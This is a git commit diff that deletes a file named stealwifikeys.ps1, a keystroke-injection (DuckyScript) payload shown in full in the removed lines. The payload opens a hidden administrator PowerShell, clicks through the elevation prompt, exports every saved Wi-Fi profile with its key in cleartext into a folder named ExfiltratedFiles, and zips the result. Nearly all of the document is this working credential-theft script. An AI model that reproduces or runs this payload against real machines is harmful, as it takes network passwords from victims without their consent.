c759711df627a654ed3d82aaddc1e7d17c694da2
felipevuln <121352298+felipevuln@users.noreply.github.com>
2025-01-25 19:48:35 +0200

    Update stealwifikeys.ps1

--- stealwifikeys.ps1
+++ stealwifikeys.ps1
@@ -1,19 +1,1 @@
-REM Description: Steals all of the saved Wifi Passwords and stores them into a file.
 
-DELAY 500
-WINDOWS d
-DELAY 500
-WINDOWS r
-DELAY 500
-STRING powershell Start-Process powershell -Verb runAs -WindowStyle Hidden
-ENTER
-DELAY 800
-LEFTARROW
-ENTER
-DELAY 800
-ALT y
-DELAY 500
-GUI UP
-DELAY 600
-STRING $folderDateTime = (get-date).ToString('d-M-y HHmmss');$userDir = 'C:\ExfiltratedFiles';$fileSaveDir = New-Item  ($userDir) -ItemType Directory;$date = get-date;netsh wlan export profile key=clear folder=$fileSaveDir;Compress-Archive -Path $fileSaveDir -DestinationPath C:\ExfiltratedFiles\ResultsPassword.zip ; exit 
-ENTER
